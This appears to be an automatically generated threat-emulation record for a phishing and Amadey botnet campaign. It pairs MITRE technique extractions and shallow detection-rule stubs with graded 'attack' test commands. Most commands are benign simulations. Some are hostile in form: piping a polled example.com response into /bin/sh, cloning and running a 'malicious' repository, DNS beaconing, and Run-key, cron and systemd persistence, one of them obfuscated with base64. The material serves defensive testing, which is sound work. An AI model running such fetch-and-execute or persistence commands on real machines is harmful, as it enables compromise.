extracted_ttps.description: Attacker used PowerShell to execute a base64 encoded command and download payloads from a third-party platform
The attacker uses spear phishing to gain initial access
Attacker used a decoy PDF document to trick the user into downloading an encrypted compressed package containing a malicious VBS script
Attacker used the net_dll payload to create a vbs and ps1 script in the %TEMP% folder for persistence
Attacker used the Amadey botnet Trojan to collect system information and steal user privacy data
Detected PowerShell activity via NLP pattern matching
Attacker used the Amadey botnet Trojan to execute remote commands and move laterally within the network
The attacker uses a bait PDF file to trick the user into executing the malicious code
The attacker uses PowerShell to execute commands
Detected Phishing activity via NLP pattern matching

extracted_ttps.technique_name: Exfiltration Over Command and Control Channel
extracted_ttps.description: The attacker exfiltrates data over a command and control channel
The attacker uses obfuscation to hide the malicious code
Attacker created scheduled tasks for persistence
Detected Create or Modify System Process activity via NLP pattern matching
Detected Process Injection activity via NLP pattern matching
Detected Application Layer Protocol activity via NLP pattern matching
Detected Obfuscated Files or Information activity via NLP pattern matching
Detected Exploit Public-Facing Application activity via NLP pattern matching
Detected Archive Collected Data activity via NLP pattern matching
Detected Scheduled Task/Job activity via NLP pattern matching
Detected User Execution: Malicious File activity via NLP pattern matching

rules.title: Detection: PowerShell
rules.description: Attacker used PowerShell to execute a base64 encoded command and download payloads from a third-party platform
falsepositives: Legitimate administrative activity

rules.title: Detection: Phishing
rules.description: The attacker uses spear phishing to gain initial access
falsepositives: Legitimate administrative activity

rules.title: Detection: User Execution
rules.description: Attacker used a decoy PDF document to trick the user into downloading an encrypted compressed package containing a malicious VBS script
falsepositives: Legitimate administrative activity

rules.title: Detection: Modify Registry
rules.description: Attacker used the net_dll payload to create a vbs and ps1 script in the %TEMP% folder for persistence
falsepositives: Legitimate administrative activity

rules.title: System Information Discovery via Amadey Botnet
rules.description: Detects system information discovery using the Amadey botnet Trojan
falsepositives: Legitimate system administration tools using cred.dll or clip.dll
False positives may occur if legitimate software uses the Amadey keyword or similar DLLs

rules.title: Detection: PowerShell
rules.description: Detected PowerShell activity via NLP pattern matching
falsepositives: Legitimate administrative activity

rules.title: Detection: Remote Services
rules.description: Attacker used the Amadey botnet Trojan to execute remote commands and move laterally within the network
falsepositives: Legitimate administrative activity

rules.title: Suspicious PowerShell Execution with Malicious Indicators and Unusual Parent Process
rules.description: Detects PowerShell executing with known malicious patterns (e.g., encoded command, bypass execution policy) or launching system utilities (net, reg, sc, at), especially when spawned from Office applications, indicating potential adversary command execution.

detection.condition: selection_powerhell and (selection_malicious_args or selection_system_util) and selection_unusual_parent

falsepositives: Administrative scripts using encoded PowerShell commands
Legitimate use of 'net', 'reg', 'sc', or 'at' via PowerShell for system management
Office documents with embedded scripts or automation used in trusted workflows

rules.title: Exfiltration Over Command and Control Channel
rules.description: Detects potential exfiltration of data over a command and control channel
falsepositives: Legitimate traffic to the destination IP
False positives due to misconfigured networks
rules.technique_name: Exfiltration Over Command and Control Channel

rules.title: Obfuscated Files or Information Detection
rules.description: Detects obfuscated files or information used by attackers to evade defense mechanisms
falsepositives: Legitimate system processes using Base64 encoding
Applications using obfuscation for non-malicious purposes

rules.title: New Service Creation for Persistence
rules.description: Detects the creation of new services for persistence using sc.exe or New-Service cmdlet
falsepositives: Legitimate system administrators creating new services
Software installation or updates creating new services

rules.title: Detection: Create or Modify System Process
rules.description: Detected Create or Modify System Process activity via NLP pattern matching
falsepositives: Legitimate administrative activity

rules.title: Process Injection via NLP Pattern Matching
rules.description: Detects Process Injection activity via NLP pattern matching
falsepositives: Legitimate system administration tasks
Software installation or updates

rules.title: Suspicious Application Layer Protocol Activity via Encoded Command Execution
rules.description: Detects potential command and control activity through the use of encoded command-line arguments in common scripting executables, indicating possible Application Layer Protocol misuse.
falsepositives: Legitimate administrative scripts using base64-encoded commands
Software deployment or configuration management tools (e.g., Ansible, Chef) executing encoded commands
PowerShell scripts used in automated testing or CI/CD pipelines

rules.title: Exploit Public-Facing Application – Suspicious Child Process Execution
rules.description: Detects execution of scripting interpreters (PowerShell, cmd, cscript) launched by known web server processes with suspicious command-line arguments, indicating possible exploitation of a public-facing application.

detection.condition: (web_parent or web_parent_httpd or web_parent_nginx or web_parent_apache or web_parent_phpcgi or web_parent_iisexpress) and (powershell_suspicious or powershell_enc or powershell_bits or cmd_suspicious or cmd_bits or cscript_suspicious) and not (exclusion_trusted_parent or exclusion_rmm)

falsepositives: Legitimate administrative scripts executed by web server processes for maintenance
Automated deployment tools that run PowerShell under web server context
Custom web applications that spawn child processes for legitimate functionality

rules.title: Detection: Archive Collected Data
rules.description: Detected Archive Collected Data activity via NLP pattern matching
falsepositives: Legitimate administrative activity

rules.title: Scheduled Task/Job Detection
rules.description: Detects Scheduled Task/Job activity via command line arguments and process creation
falsepositives: Legitimate system maintenance tasks
Scheduled tasks created by system administrators

rules.title: Detection of User Execution: Malicious File via NLP Pattern Matching
rules.description: Detects User Execution: Malicious File activity via NLP pattern matching as described in MITRE ATT&CK T1204
falsepositives: Legitimate software installations
System updates
Administrative tasks

attacks.description: Basic PowerShell encoded command that downloads a benign executable to the TEMP folder using Invoke-WebRequest and launches it hidden.
attacks.expected_behavior: A file named benign.exe is written to %TEMP% and executed silently; no visible windows appear.

attacks.description: Intermediate encoded command that uses the legacy certutil utility to download a binary payload to %TEMP% and then executes it via PowerShell.
attacks.expected_behavior: certutil writes payload.bin to the TEMP directory; PowerShell then runs the binary silently.

attacks.description: Advanced encoded command that downloads a PowerShell script from a third‑party site, saves it to %TEMP%, executes it with Invoke‑Expression, and then removes the script file using -ErrorAction SilentlyContinue.
attacks.expected_behavior: A script file is saved to the TEMP folder, its contents are executed in memory, and the file is deleted without raising errors.

attacks.description: Basic: Downloads test file from example.com to /tmp using base64-encoded PowerShell.
attacks.expected_behavior: Downloads test.txt to /tmp/ps_test.txt without user interaction.

attacks.description: Intermediate: Fetches and executes a script from example.com in memory.
attacks.expected_behavior: Downloads script.ps1 and executes it directly via Invoke-Expression.

attacks.description: Advanced: Retrieves base64-encoded payload, decodes, and executes it.
attacks.expected_behavior: Fetches encoded.txt, decodes its content from Base64, and executes the resulting PowerShell command.

attacks.description: Direct execution of VBS script extracted from encrypted ZIP
attacks.expected_behavior: The VBS script executes, displaying a benign message or creating a test file in %TEMP%.

attacks.description: Execute VBS script via PowerShell to simulate indirect execution
attacks.expected_behavior: Launches wscript.exe to execute the VBS script, simulating user-triggered execution through a PowerShell wrapper.

attacks.description: Decode base64-encoded VBS script using certutil and execute it
attacks.expected_behavior: Decodes the encoded VBS script and executes it, demonstrating obfuscated payload delivery via legitimate utilities.

attacks.description: Basic command that downloads and executes a malicious script
attacks.expected_behavior: The command downloads a malicious script and executes it using bash

attacks.description: Intermediate command that uses a package manager to download and install a malicious package
attacks.expected_behavior: The command downloads a malicious package and installs it using dpkg

attacks.command: git clone http://example.com/malicious_repo.git && cd malicious_repo && bash install.sh
attacks.description: Advanced command that uses git to clone a malicious repository and execute a script
attacks.expected_behavior: The command clones a malicious repository and executes a script using bash

attacks.command: reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v test /t REG_SZ /d "powershell.exe -WindowStyle hidden -ExecutionPolicy Bypass -File %TEMP%\test.ps1" /f
attacks.description: Add a registry key to execute a PowerShell script from the %TEMP% folder on startup
attacks.expected_behavior: The registry key will be added, and the PowerShell script will be executed on startup

attacks.description: Create a VBScript file in the %TEMP% folder using PowerShell
attacks.expected_behavior: The VBScript file will be created in the %TEMP% folder

attacks.description: Add a registry key to execute a VBScript file from the %TEMP% folder on startup
attacks.expected_behavior: The registry key will be added, and the VBScript file will be executed on startup

attacks.description: Modify a user configuration file to simulate registry modification for persistence.
attacks.expected_behavior: Creates a new file in the user's autostart directory, simulating persistence.

attacks.description: Modify the user's bash configuration file to simulate registry modification for persistence.
attacks.expected_behavior: Appends a new line to the user's bash configuration file, simulating persistence.

attacks.description: Displays system information including the operating system name, version, and architecture.
attacks.expected_behavior: Output system information to the console.

attacks.description: Displays the system's hostname.
attacks.expected_behavior: Output the system's hostname to the console.

attacks.description: Displays detailed information about the CPU(s).
attacks.expected_behavior: Output detailed CPU information to the console.

attacks.description: Basic PowerShell command to write the current date to a file in the temp directory.
attacks.expected_behavior: Creates a file named date.txt in the temp directory with the current date.

attacks.description: Intermediate PowerShell command to compress a file using Compress-Archive, demonstrating the use of `-Force` for file operations.
attacks.expected_behavior: Creates a zip archive of the date.txt file in the temp directory, overwriting any existing file with the same name due to the use of `-Force`.

attacks.description: Advanced PowerShell command demonstrating the use of Invoke-WebRequest to download content, with error handling using `-ErrorAction SilentlyContinue`.
attacks.expected_behavior: Downloads the content from the specified URI to a file named example.html in the temp directory, silently continuing if the download fails.

attacks.description: Basic command to get running processes using PowerShell on Linux.
attacks.expected_behavior: Lists running processes.

attacks.description: Intermediate command to create a file using PowerShell on Linux, demonstrating the use of -Force for file operations.
attacks.expected_behavior: Creates a file named testfile.txt in /tmp with the content 'Hello World'.

attacks.description: Advanced command to download a file using PowerShell on Linux, assuming internet access for demonstration purposes.
attacks.expected_behavior: Downloads the content from http://example.com and saves it as example.html in /tmp.

attacks.description: Start the Telnet service to enable remote command execution
attacks.expected_behavior: The Telnet service will be started, allowing remote command execution

attacks.description: Execute a remote command using PowerShell to create a test file
attacks.expected_behavior: A test file will be created in the temporary directory with the contents 'Hello World'

attacks.command: sc.exe create TestService binPath= "C:\\Windows\\System32\\cmd.exe /c echo 'Test Service' > %TEMP%\test_service.txt"
attacks.description: Create a new service using sc.exe to execute a remote command
attacks.expected_behavior: A new service will be created, and a test file will be created in the temporary directory with the contents 'Test Service'

attacks.description: Basic remote command execution to list files on a remote host
attacks.expected_behavior: Lists files on the remote host

attacks.description: Intermediate command creating a directory and listing its contents on a remote host
attacks.expected_behavior: Creates a new directory on the remote host and lists its contents

attacks.description: Advanced command simulating a malicious file creation on a remote host
attacks.expected_behavior: Creates a file named malicious_file.txt on the remote host

attacks.description: Basic command to create a file using PowerShell on Linux
attacks.expected_behavior: Creates a file named test.txt in the /tmp directory with the content 'Hello World'

attacks.description: Intermediate command to compress a file using PowerShell on Linux
attacks.expected_behavior: Compresses the test.txt file into a zip archive named test.zip in the /tmp directory, overwriting any existing file

attacks.description: Advanced command to execute a script using PowerShell on Linux
attacks.expected_behavior: Executes the default associated application for the test.zip file, potentially extracting its contents

attacks.command: echo Benign test content > %TEMP%\test.txt && certutil -encode %TEMP%\test.txt %TEMP%\encoded.txt && certutil -decode %TEMP%\encoded.txt %TEMP%\decoded.txt
attacks.description: Base64 encode/decode file using certutil
attacks.expected_behavior: Creates test.txt, encodes to Base64 (encoded.txt), then decodes back to decoded.txt

attacks.description: Create password-protected ZIP with SecureString
attacks.expected_behavior: Creates AES-encrypted ZIP archive containing test.txt file

attacks.description: XOR-obfuscate text payload to binary file
attacks.expected_behavior: Creates payload.bin with XOR-encoded bytes from 'TestData' string

attacks.description: Creates a file named test.txt containing the decoded string 'Hello world!' using base64, then makes it executable.
attacks.expected_behavior: A file named test.txt will be created in the current directory with the contents 'Hello world!' and will be executable.

attacks.description: Creates a file named malicious.txt, adds some content, and then compresses it using gzip to conceal the file's contents.
attacks.expected_behavior: A compressed file named malicious.txt.gz will be created in the current directory, containing the original 'malicious' content.

attacks.description: Combines base64 decoding with gzip compression to further obfuscate the contents of a file.
attacks.expected_behavior: A compressed file named obfuscated.txt.gz will be created, containing the decoded string 'Hello world!' from the base64 input.

attacks.description: Create a daily scheduled task to execute a command that writes 'Test' to a file in the temp directory.
attacks.expected_behavior: A new task named 'Test Task' is created and executes daily, writing 'Test' to a file in the temp directory.

attacks.command: powershell -Command "schtasks /create /tn 'Test Task PowerShell' /tr 'powershell -Command "echo Test | Out-File -FilePath %TEMP%\test_ps.txt"' /sc daily"
attacks.description: Create a daily scheduled task using PowerShell to execute a command that writes 'Test' to a file in the temp directory.
attacks.expected_behavior: A new task named 'Test Task PowerShell' is created and executes daily, writing 'Test' to a file in the temp directory using PowerShell.

attacks.command:
cat > /tmp/malicious.service << 'EOF'
[Unit]
Description=Malicious Test Service

[Service]
Type=simple
ExecStart=/bin/sh -c 'while true; do echo "Test heartbeat" >> /tmp/service.log; sleep 60; done'
Restart=always

[Install]
WantedBy=multi-user.target
EOF
sudo mv /tmp/malicious.service /etc/systemd/system/malicious.service
sudo systemctl daemon-reload
sudo systemctl enable malicious.service
sudo systemctl start malicious.service
attacks.description: Creates a new systemd service using a heredoc to define a persistent background task that logs every 60 seconds
attacks.expected_behavior: A new service 'malicious.service' is created, enabled, and started. It appends 'Test heartbeat' to /tmp/service.log every minute. Requires root to write to /etc/systemd/system.

attacks.command:
echo '#!/bin/sh
echo "Service started at $(date)" >> /tmp/persistence.log' > /tmp/svc_payload.sh
chmod +x /tmp/svc_payload.sh
cat > /tmp/testpersistence.service << 'EOF'
[Unit]
Description=Test Persistence Service

[Service]
ExecStart=/tmp/svc_payload.sh
Restart=on-failure

[Install]
WantedBy=multi-user.target
EOF
sudo install -m 644 /tmp/testpersistence.service /etc/systemd/system/testpersistence.service
sudo systemctl daemon-reload
sudo systemctl enable testpersistence.service
sudo systemctl start testpersistence.service
attacks.description: Intermediate approach: creates a payload script and installs a systemd service that runs it, enabling persistence
attacks.expected_behavior: A script is created in /tmp and a service unit installed. The service runs the script once (or on failure). Logs startup time to /tmp/persistence.log. Requires root for service installation.

attacks.command:
PAYLOAD_CMD='while :; do echo "$(date): Keep-alive" >> /tmp/keepalive.log; sleep 300; done'
ENCODED=$(echo "$PAYLOAD_CMD" | base64 -w0)
SERVICE_FILE="/tmp/obfservice.service"
cat > "$SERVICE_FILE" << EOF
[Unit]
Description=Obfuscated Service

[Service]
Type=simple
ExecStart=/bin/sh -c 'eval $(echo $ENCODED | base64 -d)'
Restart=always

[Install]
WantedBy=multi-user.target
EOF
sudo cp "$SERVICE_FILE" /etc/systemd/system/obfservice.service
sudo systemctl daemon-reload
sudo systemctl enable obfservice.service
sudo systemctl start obfservice.service
attacks.description: Advanced: creates a systemd service with a base64-encoded command to obfuscate the payload logic
attacks.expected_behavior: A service is created with a base64-encoded command that, when decoded and executed, runs a loop logging every 5 minutes. This simulates obfuscated persistence. Requires root for service registration.

attacks.description: Lists all running services, demonstrating the ability to view system processes
attacks.expected_behavior: Displays a list of running services

attacks.description: Creates a new service named TestService that runs cmd.exe, demonstrating the creation of a system process
attacks.expected_behavior: Creates a new service named TestService

attacks.description: Uses PowerShell to start a new process that runs cmd.exe and creates a test file, demonstrating the modification of a system process
attacks.expected_behavior: Creates a new file named test.txt in the Windows Temp directory

attacks.command: echo '* * * * * root echo "Test persistence via cron" >> /tmp/cron_test.log' > /etc/cron.d/test_persistence
attacks.description: Creates a system-wide cron job that executes every minute as root
attacks.expected_behavior: A cron job is added to /etc/cron.d/ and runs every minute, appending a test message to /tmp/cron_test.log

attacks.command:
printf '[Unit]
Description=Malicious Test Service
[Service]
Type=simple
ExecStart=/bin/sh -c "echo \"$(date): Service started\" >> /tmp/test_service.log"
[Install]
WantedBy=multi-user.target' > /etc/systemd/system/test_persistence.service && systemctl daemon-reload && systemctl enable test_persistence.service
attacks.description: Creates and enables a persistent systemd service that logs execution
attacks.expected_behavior: A new systemd service is written to /etc/systemd/system/, enabled at boot, and will start on next boot or manual systemctl start

attacks.command: echo '#!/bin/sh -e\necho "Init script executed at $(date)" >> /tmp/init_script.log' > /etc/init.d/test_init && chmod +x /etc/init.d/test_init && update-rc.d test_init defaults
attacks.description: Installs a System V init script for persistence on older Linux systems
attacks.expected_behavior: An init script is created in /etc/init.d/, made executable, and registered to run at boot via update-rc.d

attacks.description: Basic command to create a file using PowerShell
attacks.expected_behavior: Creates a file named test.txt in the temp directory with the contents 'Hello World'

attacks.description: Intermediate command to download a file using certutil
attacks.expected_behavior: Downloads a file from http://example.com/test.txt and saves it to the temp directory

attacks.description: Advanced command to download a file using PowerShell with error handling
attacks.expected_behavior: Downloads a file from http://example.com/test.txt and saves it to the temp directory, ignoring any errors that may occur

attacks.description: Basic HTTP GET request to simulate beaconing to a C2 server using curl
attacks.expected_behavior: Sends a silent HTTP GET request to example.com/c2 beacon and discards the response. Simulates periodic C2 beaconing without data exfiltration.

attacks.command: wget --user-agent='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' --header='X-C2-Channel: tunnel-1' -qO- http://example.com/api/poll | /bin/sh
attacks.description: Intermediate C2 polling with custom User-Agent and header to blend traffic, executing returned content
attacks.expected_behavior: Polls a URL with spoofed browser signature and custom header. Any returned data would be executed in shell; in testing, returns nothing or test output.

attacks.command: (while true; do sleep 60; host "$(date +%s).beacon.example.com" 2>/dev/null || true; done) &
attacks.description: Advanced: Simulates DNS tunneling beacon by encoding timestamp in subdomain and querying recursively
attacks.expected_behavior: Runs in background, every 60 seconds performs a DNS lookup for a dynamically generated timestamped subdomain of beacon.example.com, simulating DNS-based C2 beaconing.

attacks.description: Basic command to test interaction with a potentially vulnerable web application
attacks.expected_behavior: The command should send a GET request to the specified URL, simulating user interaction.

attacks.description: Intermediate command to recursively scan a web application for potential vulnerabilities
attacks.expected_behavior: The command should scan the specified URL for links and simulate a login attempt without actually exploiting any vulnerabilities.

attacks.description: Advanced command to simulate a POST request with JSON data to a potentially vulnerable login endpoint
attacks.expected_behavior: The command should send a POST request with JSON data to the specified login endpoint, simulating a user login attempt.

attacks.description: Compress a test file into a zip archive using PowerShell.
attacks.expected_behavior: A zip file named test.zip will be created in the temp directory containing the test.txt file.

attacks.description: Create a zip archive from a directory using PowerShell and .NET classes indirectly through Add-Type.
attacks.expected_behavior: A zip file named test2.zip will be created in the temp directory containing the files from the specified directory.

attacks.description: Basic example of archiving collected data using tar
attacks.expected_behavior: Creates a tar archive of the specified data

attacks.description: Advanced example of archiving collected data using find and tar
attacks.expected_behavior: Uses find to search for files in the specified directory and archives them using tar

attacks.description: Create a daily scheduled task to launch Notepad
attacks.expected_behavior: Creates a scheduled task named TestTask that opens Notepad.exe daily at 9:00 AM

attacks.description: Create logon-triggered task via PowerShell to write test file
attacks.expected_behavior: Creates task 'Updater' that executes cmd.exe to write to TEMP\test.txt upon user login

attacks.command: cmd.exe /c echo ^<?xml version="1.0" encoding="UTF-16"?^> ^<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task"^>^<Triggers^>^<LogonTrigger^>^<Enabled^>true^</Enabled^>^</LogonTrigger^>^</Triggers^>^<Actions^>^<Exec^>^<Command^>cmd.exe^</Command^>^<Arguments^>/c echo Testing ^^> %TEMP%\test_advanced.txt^</Arguments^>^</Exec^>^</Actions^>^</Task^> > "%TEMP%\task.xml" && schtasks /Create /XML "%TEMP%\task.xml" /TN "AdvancedTask"
attacks.description: Advanced XML-based task creation with logon trigger
attacks.expected_behavior: Generates XML task definition and creates 'AdvancedTask' that writes to TEMP\test_advanced.txt on system logon

attacks.description: Open the cron table for editing to schedule a new task
attacks.expected_behavior: The cron table will be opened in the default editor, allowing the user to add a new scheduled task

attacks.description: Schedule a task to run a benign command at midnight every day
attacks.expected_behavior: The command will be added to the cron table and will run at midnight every day, printing 'Hello World' to the console

attacks.command:
echo '#!/bin/bash
echo "Hello World"' > /tmp/script.sh; chmod +x /tmp/script.sh; echo '0 0 * * * /tmp/script.sh' | crontab -
attacks.description: Schedule a task to run a script at midnight every day
attacks.expected_behavior: The script will be created, made executable, and added to the cron table. It will run at midnight every day, printing 'Hello World' to the console. Note: This command is high risk due to the potential for malicious script execution

attacks.description: Downloads a malicious file using certutil and executes it
attacks.expected_behavior: The malicious file will be downloaded and executed

attacks.description: Executes a malicious PowerShell script using Invoke-Item
attacks.expected_behavior: The malicious PowerShell script will be executed

attacks.description: Executes a malicious batch file using cmd.exe
attacks.expected_behavior: The malicious batch file will be executed

attacks.description: Create a benign 'malicious' file, make it executable, and then execute it.
attacks.expected_behavior: The file will be created, made executable, and then executed without any harmful effects.

attacks.description: Copy a benign system binary to a file named 'malicious_file', make it executable (if necessary), and execute it.
attacks.expected_behavior: The 'malicious_file' will be created as a copy of /bin/echo, potentially made executable, and then executed, printing its arguments to the console.

attacks.description: Create a script that prints 'Hello World', make it executable, and then execute it.
attacks.expected_behavior: The script will be created, made executable, and then executed, printing 'Hello World' to the console.
